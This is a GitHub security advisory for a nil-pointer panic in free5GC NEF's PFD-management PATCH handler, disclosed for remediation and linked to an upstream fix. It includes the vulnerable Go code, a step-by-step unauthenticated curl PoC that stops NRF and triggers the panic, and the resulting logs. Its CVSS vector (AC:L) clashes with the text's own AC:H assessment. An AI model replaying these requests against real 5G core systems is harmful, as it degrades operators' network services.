# [H] free5GC's NEF 3gpp-pfd-management PATCH applications/{appId} panics on UDR access failure due to nil ProblemDetails dereference

## Summary
Severity: High
Advisory: GHSA-j59f-x285-69jx
CVE: CVE-2026-44322
CWE: CWE-476, CWE-754
Ecosystem: Go
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H (CVSS_V3)
Published: 2026-05-08
Source: https://github.com/advisories/GHSA-j59f-x285-69jx
Type: github-advisory

## Affected
- Go: `github.com/free5gc/nef` — affected >=0 <1.2.3

## Details
### Summary
free5GC's NEF `PATCH /3gpp-pfd-management/v1/{afId}/transactions/{transId}/applications/{appId}` handler panics with a nil-pointer dereference when the upstream UDR call fails AND the consumer wrapper returns `err != nil` together with a nil `*ProblemDetails`. The handler's `errPfdData != nil` branch builds its own `problemDetailsErr` correctly, but immediately after it reads `problemDetails.Cause` (the OTHER value, which is nil in this branch) and panics. Gin recovery converts the panic into `HTTP 500`, so a single PATCH against this endpoint returns 500 instead of the intended controlled error response whenever UDR access is failing.

This is a second-order bug: the trigger requires UDR access to be failing (e.g. NRF or UDR is unreachable, registration broken, transient network failure). The attacker does not directly control that condition, so this is scored as AC:H. Once the upstream condition exists, the trigger is a single PATCH request and is repeatable.

The HTTP request itself in v4.2.1 is reachable without an `Authorization` header because the underlying NEF `3gpp-pfd-management` route group is mounted without inbound auth middleware (see free5gc/free5gc#858). So in the validation lab the entire trigger chain is unauthenticated end-to-end.

### Details
Validated against the NEF container in the official Docker compose lab.
- Source repo tag: `v4.2.1`
- Running Docker image: `free5gc/nef:v4.2.1`
- Runtime NEF commit: `5ce35eab`
- Docker validation date: 2026-03-21 (container log timestamp `2026-03-21T03:06:36Z`)
- NEF endpoint: `http://10.100.200.19:8000`

Vulnerable handler logic in `PatchIndividualApplicationPFDManagement` (paraphrased):
```go
pdfData, problemDetails, errPfdData := p.Consumer().AppDataPfdsAppIdGet(appID)

switch {
case problemDetails != nil:
    ...
case errPfdData != nil:
    problemDetailsErr := &models.ProblemDetails{
        Status: http.StatusInternalServerError,
        Detail: "Query to UDR failed",
    }
    c.Set(sbi.IN_PB_DETAILS_CTX_STR, problemDetails.Cause)   // <-- nil deref
    c.JSON(int(problemDetailsErr.Status), problemDetailsErr)
    return
}
```
In the `errPfdData != nil` branch, `problemDetails` is by construction nil (otherwise the first `case` would have matched). Reading `problemDetails.Cause` panics with `runtime error: invalid memory address or nil pointer dereference`. The intended value is presumably `problemDetailsErr.Cause` -- the locally constructed problem-details struct.

Code evidence (paths in `free5gc/nef`):
- Patch handler core path:
  - `NFs/nef/internal/sbi/processor/pfd.go:563`
  - `NFs/nef/internal/sbi/processor/pfd.go:610`
- Panic site (nil-deref on `problemDetails.Cause`):
  - `NFs/nef/internal/sbi/processor/pfd.go:622`
- Route exposure / dispatch:
  - `NFs/nef/internal/sbi/api_pfd.go:168`
  - `NFs/nef/internal/sbi/api_pfd.go:188`

### PoC
Reproduced end-to-end against the running NEF at `http://10.100.200.19:8000`. The trigger requires UDR access to be failing -- the lab simulates this by stopping NRF (so NEF's UDR client fails to discover/dial UDR). In production, equivalent triggers include NRF outages, UDR outages, or transient network failures.

1. Create an AF context (no Authorization header):
```
curl -i -X POST 'http://10.100.200.19:8000/3gpp-traffic-influence/v1/afnpd3/subscriptions' \
  -H 'Content-Type: application/json' \
  --data '{"afAppId":"app-nef-npd3","anyUeInd":true}'
```

2. Create a PFD-management transaction:
```
curl -i -X POST 'http://10.100.200.19:8000/3gpp-pfd-management/v1/afnpd3/transactions' \
  -H 'Content-Type: application/json' \
  --data '{"pfdDatas":{"appnpd3":{"externalAppId":"appnpd3","pfds":{"pfd1":{"pfdId":"pfd1","flowDescriptions":["permit in ip from 10.68.28.39 80 to any"]}}}}}'
```

3. Make UDR access fail (lab simulation):
```
docker stop nrf
```

4. Trigger the panic with one PATCH:
```
curl -i -X PATCH 'http://10.100.200.19:8000/3gpp-pfd-management/v1/afnpd3/transactions/1/applications/appnpd3' \
  -H 'Content-Type: application/json' \
  --data '{"externalAppId":"appnpd3","pfds":{"pfd1":{"pfdId":"pfd1","flowDescriptions":[]}}}'
```
```
HTTP/1.1 500 Internal Server Error
Content-Length: 0
```

5. NEF container logs (`docker logs --since 2026-03-21T03:06:36Z nef`) confirm the nil-deref panic at `pfd.go:622` inside `PatchIndividualApplicationPFDManagement`:
```
[INFO][NEF][PFDMng] PatchIndividualApplicationPFDManagement - scsAsID[afnpd3], transID[1], appID[appnpd3]
[ERRO][NEF][GIN] panic: runtime error: invalid memory address or nil pointer dereference
github.com/free5gc/nef/internal/sbi/processor.(*Processor).PatchIndividualApplicationPFDManagement
    .../pfd.go:622
github.com/free5gc/nef/internal/sbi.(*Server).apiPatchIndividualApplicationPFDManagement
    .../api_pfd.go:188
[INFO][NEF][GIN] | 500 | PATCH | /3gpp-pfd-management/v1/afnpd3/transactions/1/applications/appnpd3 |
```

6. Restore for further testing:
```
docker start nrf
```

### Impact
NULL pointer dereference (CWE-476) caused by improper handling of an exceptional branch (CWE-754): the `errPfdData != nil` branch reads `problemDetails.Cause` even though `problemDetails` is nil by construction in that branch (the prior `case` already matched the non-nil case). The intended target was the locally constructed `problemDetailsErr.Cause`.

Gin recovery catches the panic, so the NEF process is NOT killed and other endpoints continue serving. The realized impact is per-request: PATCH against this endpoint returns `500` (with empty body and a stack trace in NEF logs) instead of the intended controlled UDR-failure response, whenever upstream UDR access is failing.

No Confidentiality impact (the response is `500` with empty body). No persistent Integrity impact (the panic happens before any state mutation). Availability impact is limited to per-request degradation and only fires while UDR access is independently broken; the attacker does not directly control that precondition, so AC:H is the honest assessment.

Affected: free5gc v4.2.1.

Upstream issue: https://github.com/free5gc/free5gc/issues/925
Upstream fix: https://github.com/free5gc/nef/pull/22

## References
- https://github.com/free5gc/free5gc/security/advisories/GHSA-j59f-x285-69jx
- https://nvd.nist.gov/vuln/detail/CVE-2026-44322
- https://github.com/free5gc/free5gc/issues/925
- https://github.com/free5gc/nef/pull/22
- https://github.com/free5gc/nef/commit/72a47f3fab4dffbd227f8d92c5f69dca93b610cb
- https://github.com/free5gc/free5gc
